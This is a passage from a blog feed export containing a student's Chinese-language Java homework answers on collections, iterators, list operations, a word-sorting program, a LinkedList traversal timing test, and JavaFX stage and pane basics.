<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这是一个简单的例子，实际应用中，服务器端通常会在一个独立的线程中一直等待连接请求，而客户端可能需要在不同的线程中处理和服务器的通信。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Java作业-2</title>
    <url>/2023/09/19/16-26-30/</url>
    <content><![CDATA[<p>描述Java 合集框架。列出Collection 接口下面的接口、便利抽象类以及具体类<br>
使用什么方法来从迭代器得到合集中的一个元素?<br>
ArrayList与LinkedList 之间的区别是什么?应该使用哪种线性表在一个线性表的起始位置插入和删除元素<br>
······</p>
<span id="more"></span>
<h2 id="描述java-合集框架-列出collection-接口下面的接口-便利抽象类以及具体类"><a class="markdownIt-Anchor" href="#描述java-合集框架-列出collection-接口下面的接口-便利抽象类以及具体类"></a> 描述Java 合集框架。列出Collection 接口下面的接口、便利抽象类以及具体类</h2>
<p>Collection定义了各种数据结构和算法的标准API</p>
<table>
<thead>
<tr>
<th>接口</th>
<th>说明</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>List</td>
<td>有序集合，可以包含重复元素</td>
<td>ArrayList/LinkedList/Vector/Stack</td>
</tr>
<tr>
<td>Set</td>
<td>无序集合，不包含重复元素</td>
<td>HashSet/LinkedHashSet/TreeSet</td>
</tr>
<tr>
<td>Queue</td>
<td>元素按特定方式进行排列的集合</td>
<td>LinkedList/PriorityQueue</td>
</tr>
<tr>
<td>Deque</td>
<td>双端队列接口</td>
<td>ArrayDeque/LinkedList</td>
</tr>
</tbody>
</table>
<p>便利抽象类用于简化新合集类型的创建</p>
<table>
<thead>
<tr>
<th>便利抽象类</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>AbstractCollection</td>
<td>实现Collection接口的基础抽象类</td>
</tr>
<tr>
<td>AbstractList</td>
<td>实现List接口的抽象类</td>
</tr>
<tr>
<td>AbstractSet</td>
<td>实现Set接口的抽象类</td>
</tr>
<tr>
<td>AbstractQueue</td>
<td>实现Queue接口的抽象类</td>
</tr>
<tr>
<td>AbstractSequentialList</td>
<td>用于继承链表结构的抽象类</td>
</tr>
<tr>
<td>AbstractMap</td>
<td>实现Map接口的抽象类（虽然Map不是Collection接口的一部分，但通常也被认为是合集框架的一部分）</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>具体类</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>ArrayList</td>
<td>动态数组实现的列表。</td>
</tr>
<tr>
<td>LinkedList</td>
<td>双向链表实现的列表和双端队列。</td>
</tr>
<tr>
<td>HashSet</td>
<td>基于哈希表的集合。</td>
</tr>
<tr>
<td>LinkedHashSet</td>
<td>基于哈希表和链表的集合。</td>
</tr>
<tr>
<td>TreeSet</td>
<td>基于红黑树的排序集合。</td>
</tr>
<tr>
<td>PriorityQueue</td>
<td>基于堆结构的优先队列。</td>
</tr>
<tr>
<td>ArrayDeque</td>
<td>动态数组实现的双端队列。</td>
</tr>
<tr>
<td>Vector</td>
<td>线程安全的动态数组。</td>
</tr>
<tr>
<td>Stack</td>
<td>Vector的一个子类，实现了一个后进先出（LIFO）的栈。</td>
</tr>
</tbody>
</table>
<h2 id="使用什么方法来从迭代器得到合集中的一个元素"><a class="markdownIt-Anchor" href="#使用什么方法来从迭代器得到合集中的一个元素"></a> 使用什么方法来从迭代器得到合集中的一个元素?</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 获取迭代器对象：首先使用合集的 iterator() 方法获取一个迭代器对象。</span>
<span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> iterator <span class="token operator">=</span> myCollection<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 检查是否有下一个元素：使用 hasNext() 方法检查迭代器中是否还有更多的元素。</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 获取下一个元素：如果有下一个元素，使用 next() 方法获取它。</span>
    <span class="token class-name">String</span> element <span class="token operator">=</span> iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="arraylist与linkedlist-之间的区别是什么应该使用哪种线性表在一个线性表的起始位置插入和删除元素"><a class="markdownIt-Anchor" href="#arraylist与linkedlist-之间的区别是什么应该使用哪种线性表在一个线性表的起始位置插入和删除元素"></a> ArrayList与LinkedList 之间的区别是什么?应该使用哪种线性表在一个线性表的起始位置插入和删除元素</h2>
<table>
<thead>
<tr>
<th>区别</th>
<th>ArrayList</th>
<th>LinkedList</th>
</tr>
</thead>
<tbody>
<tr>
<td>底层数据结构</td>
<td>基于动态数组实现。</td>
<td>基于双向链表实现。</td>
</tr>
<tr>
<td>随机访问</td>
<td>提供快速的随机访问，时间复杂度是O(1)</td>
<td>随机访问相对较慢，时间复杂度是 O(n)</td>
</tr>
<tr>
<td>插入和删除</td>
<td>在列表的中间或起始位置插入和删除元素需要移动元素，时间复杂度是 O(n)。但在末尾的插入和删除是快速的，时间复杂度是 O(1)</td>
<td>在列表的起始位置、中间或末尾插入和删除元素都很快，时间复杂度是 O(1)</td>
</tr>
<tr>
<td>内存开销</td>
<td>由于是数组-based，内存利用率相对较高</td>
<td>需要额外的内存来存储链表的前后关系（节点的前驱和后继），所以内存开销更大</td>
</tr>
<tr>
<td>扩容</td>
<td>当数组达到容量上限时需要进行扩容，这是一个时间复杂度为 O(n) 的操作</td>
<td>由于是链表结构，不需要像数组那样进行扩容</td>
</tr>
</tbody>
</table>
<p>在起始位置插入和删除元素时，LinkedList 通常是更好的选择，因为这些操作的时间复杂度是 O(1)。ArrayList 需要移动所有其他元素来填补空位或创建空位，所以这些操作的时间复杂度是 O(n)。</p>
<h2 id="假设list1是一个包含字符串-red-yellow-green的线性表list2是一个包含字符串red-yellow-blue的线性表"><a class="markdownIt-Anchor" href="#假设list1是一个包含字符串-red-yellow-green的线性表list2是一个包含字符串red-yellow-blue的线性表"></a> 假设list1是一个包含字符串 red、yellow、green的线性表，list2是一个包含字符串red、yellow、blue的线性表</h2>
<ul>
<li>执行完list1.addAll(list2)方法之后，线性表 list1和list2分别变成了什么?<br>
[red, yellow, green, red, yellow, blue]<br>
[red, yellow, blue]</li>
<li>执行完list1.add(list2)方法之后，线性表list1和list2分别变成了什么?<br>
<code>The method add(String) in the type ArrayList&lt;String&gt; is not applicable for the arguments (ArrayList&lt;String&gt;)Java(67108979)</code><br>
这参数不对吧-_-</li>
<li>执行完list1.removeAll(list2)方法之后，线性表list1和list2分别变成了什么?<br>
[green]<br>
[red, yellow, blue]</li>
<li>执行完list1.remove(list2)方法之后，线性表list1和list2分别变成了什么?<br>
<code>Unlikely argument type ArrayList&lt;String&gt; for remove(Object) on a Collection&lt;String&gt;Java(1200)</code><br>
[red, yellow, green]<br>
[red, yellow, blue]</li>
<li>执行完list1.retainAll(list2)方法之后，线性表list1和list2分别变成了什么?<br>
[red, yellow]<br>
[red, yellow, blue]</li>
<li>执行完list1.clear()方法之后，线性表list1变成了什么?<br>
[]</li>
</ul>
<h2 id="什么时候一个方法应该抛出-unsupportedoperationexception-异常"><a class="markdownIt-Anchor" href="#什么时候一个方法应该抛出-unsupportedoperationexception-异常"></a> 什么时候一个方法应该抛出 UnsupportedOperationException 异常?</h2>
<p>用于标明“这个操作在这个上下文中没有意义或不被支持”<br>
常见情况：</p>
<ul>
<li>不可修改的集合：试图修改一个不可修改（unmodifiable）或只读的集合时，通常会抛出这种异常。例如，Collections.unmodifiableList() 返回一个不可修改的列表，对这个列表调用任何修改操作（如 add, remove 等）都会抛出 UnsupportedOperationException。</li>
<li>部分实现接口：有些类只部分实现某个接口，并不提供接口中所有方法的完整实现。在这种情况下，不支持的方法通常会抛出 UnsupportedOperationException。</li>
<li>不支持的操作：某些数据结构有固有的限制，不能执行某些操作。例如，在一个队列（Queue）实现中，如果某个特定操作（比如在固定大小队列中添加元素）是不被支持的，那么尝试执行该操作将抛出此异常。</li>
<li>抽象类和接口：当一个抽象类或接口定义了一个方法，但没有提供默认实现，并且该方法对于该类或接口没有意义时，通常会在该方法体中抛出 UnsupportedOperationException。</li>
<li>为了明确性：在某些情况下，即使技术上可以实现某个操作，但为了避免误导，也会选择抛出这个异常。例如，在一个不可变对象的 setter 方法中。</li>
</ul>
<h2 id="按字母序的升序显示单词编写一个程序从文本文件读取单词并按字母的升序显示所有的单词可以重复-单词必须以字母开始-文本文件作为命令行参数传递"><a class="markdownIt-Anchor" href="#按字母序的升序显示单词编写一个程序从文本文件读取单词并按字母的升序显示所有的单词可以重复-单词必须以字母开始-文本文件作为命令行参数传递"></a> (按字母序的升序显示单词)编写一个程序，从文本文件读取单词，并按字母的升序显示所有的单词(可以重复)。单词必须以字母开始。文本文件作为命令行参数传递</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileNotFoundException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStreamReader</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReadSort</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">FileNotFoundException</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请输入要读取的文件路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> fileName <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"读取的文件为："</span> <span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> words <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">Scanner</span> sc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>
                    <span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// while (sc.hasNextLine()) { // 按行读取字符串</span>
                <span class="token comment">// String line = sc.nextLine();</span>
                <span class="token comment">// System.out.println(line);</span>
                <span class="token comment">// }</span>
                sc<span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\s+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 使用空白作为默认分隔符</span>

                <span class="token keyword">while</span> <span class="token punctuation">(</span>sc<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">String</span> word <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>word<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"^[A-z]+.*"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        words<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>words<span class="token punctuation">)</span><span class="token punctuation">;</span>
            words<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>words<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="在链表上使用遍历器编写一个测试程序在一个链表上存储-500-万个整数测试分别使用iterator-和使用-getindex方法的遍历时间"><a class="markdownIt-Anchor" href="#在链表上使用遍历器编写一个测试程序在一个链表上存储-500-万个整数测试分别使用iterator-和使用-getindex方法的遍历时间"></a> (在链表上使用遍历器)编写一个测试程序，在一个链表上存储 500 万个整数，测试分别使用iterator 和使用 get(index)方法的遍历时间</h2>
<p>使用get(index)遍历链表（特别是LinkedList）通常比使用迭代器要慢得多，因为每次调用get(index)都需要从链表头部或尾部遍历到指定的索引位置。这会使得遍历整个链表的时间复杂度变为O(n^2)。与此同时，使用迭代器只需要O(n)的时间。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">LinkedList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ListIterator</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LinkedListTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 创建一个包含500万个整数的链表</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5_000_000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 使用迭代器遍历链表，并计算所需时间</span>
        <span class="token keyword">long</span> startTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ListIterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> iterator <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">listIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">long</span> endTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"使用迭代器遍历链表所需时间： "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>endTime <span class="token operator">-</span> startTime<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"ms"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 使用 get(index) 遍历链表，并计算所需时间</span>
        startTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        endTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"使用 get(index) 遍历链表所需时间： "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>endTime <span class="token operator">-</span> startTime<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"ms"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试结果(ms)</p>
<table>
<thead>
<tr>
<th>数量</th>
<th>iterator</th>
<th>get(index)</th>
</tr>
</thead>
<tbody>
<tr>
<td>5000</td>
<td>~0</td>
<td>15</td>
</tr>
<tr>
<td>50000</td>
<td>2</td>
<td>799</td>
</tr>
<tr>
<td>100000</td>
<td>2</td>
<td>3067</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Java作业-3</title>
    <url>/2023/09/26/04-20-05/</url>
    <content><![CDATA[<p>JavaFX相关实践</p>
<span id="more"></span>
<h2 id="如何定义javafx主类-start-方法的签名是什么什么是台什么是主台-主台是自动生成的吗如何显示一个舞台可以阻止用户改变舞台大小吗在程序清单-14-1-中可以将第22行的applicationlaunchargs替代为-launchargs吗"><a class="markdownIt-Anchor" href="#如何定义javafx主类-start-方法的签名是什么什么是台什么是主台-主台是自动生成的吗如何显示一个舞台可以阻止用户改变舞台大小吗在程序清单-14-1-中可以将第22行的applicationlaunchargs替代为-launchargs吗"></a> 如何定义JavaFX主类? start 方法的签名是什么?什么是台?什么是主台? 主台是自动生成的吗?如何显示一个舞台?可以阻止用户改变舞台大小吗?在程序清单 14-1 中，可以将第22行的Application.launch(args)替代为 launch(args)吗?</h2>
<ul>
<li><strong>如何定义JavaFX主类?</strong><br>
在JavaFX中，主类应该继承javafx.application.Application。这样可以定义启动应用程序的start方法。</li>
<li><strong>start 方法的签名是什么?</strong><br>
public void start(Stage primaryStage) throws Exception;</li>
<li><strong>什么是台？</strong><br>
“台"在JavaFX中通常指的是"Stage”。它是JavaFX应用程序中的顶级窗口。可以把它想象成一个应用程序窗口，并在其中放置各种UI元素和场景。</li>
<li><strong>什么是主台?</strong><br>
当JavaFX应用程序启动时，系统传递给start方法的Stage对象就是主台(primaryStage)。可以在这个Stage上设置场景(Scene)和其他UI元素。</li>
<li><strong>主台是自动生成的吗?</strong><br>
JavaFX应用程序启动时，系统会自动为你创建一个主台，并将其传递给start方法。</li>
<li><strong>如何显示一个舞台?</strong><br>
primaryStage.show();</li>
<li><strong>可以阻止用户改变舞台大小吗?</strong><br>
primaryStage.setResizable(false);</li>
<li><strong>在程序清单 14-1 中，可以将第22行的Application.launch(args)替代为 launch(args)吗?</strong><br>
如果JavaFX主类继承了Application类，那么可以直接使用launch(args)，而不需要Application.launch(args)。这是因为launch是Application类的一个静态方法，主类继承了这个类就可以直接调用。</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">Button</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyJavaFX</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>
  <span class="token keyword">public</span> <span class="token class-name">MyJavaFX</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token comment">// System.out.println("constructor");</span>
  <span class="token punctuation">}</span>

    <span class="token comment">//  @Override // Override the start method in the Application class</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">//  System.out.println("start");</span>
    <span class="token comment">// Create a button and place it in the scene</span>
    <span class="token class-name">Button</span> btOK <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"OK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>btOK<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"MyJavaFX"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Set the stage title</span>
    primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Place the scene in the stage</span>
    primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Display the stage</span>
  <span class="token punctuation">}</span>

  <span class="token comment">/**
   * The main method is only needed for the IDE with limited
   * JavaFX support. Not needed for running from the command line.
   */</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// System.out.println("launch");</span>
    <span class="token function">launch</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="什么是面板什么是节点如何将一个节点置于面板中可以直接将-shape-或者-imageview置于scene中吗可以将-control或者-pane-直接置于scene-中吗"><a class="markdownIt-Anchor" href="#什么是面板什么是节点如何将一个节点置于面板中可以直接将-shape-或者-imageview置于scene中吗可以将-control或者-pane-直接置于scene-中吗"></a> 什么是面板?什么是节点?如何将一个节点置于面板中?可以直接将 Shape 或者 ImageView置于Scene中吗?可以将 Control或者 Pane 直接置于Scene 中吗?</h2>
<ul>
<li>
<p>什么是面板?<br>
在JavaFX中，面板通常指的是Pane类及其子类。面板用于组织和布局界面中的UI组件。例如，HBox, VBox, GridPane, BorderPane等都是面板的示例。</p>
</li>
<li>
<p>什么是节点?<br>
在JavaFX中，节点是场景图中的一个元素。所有的JavaFX UI组件，无论是按钮、文本、图像还是其他元素，都是Node的子类。场景图是由这些节点组成的树状结构。</p>
</li>
<li>
<p>如何将一个节点置于面板中?<br>
面板（Pane及其子类）有一个getChildren()方法，该方法返回一个<code>ObservableList&lt;Node&gt;</code>，可以将节点添加到这个列表中。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Button</span> button <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Click Me"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Pane</span> pane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
pane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>button<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>可以直接将 Shape 或者 ImageView置于Scene中吗?<br>
不能直接这么做。Scene的构造函数需要一个Parent对象作为其根元素。Shape和ImageView都是Node的子类，但不是Parent的子类。但你可以先将它们放在一个Pane（或其他类型的面板）中，然后再将该面板置于Scene中。</p>
</li>
<li>
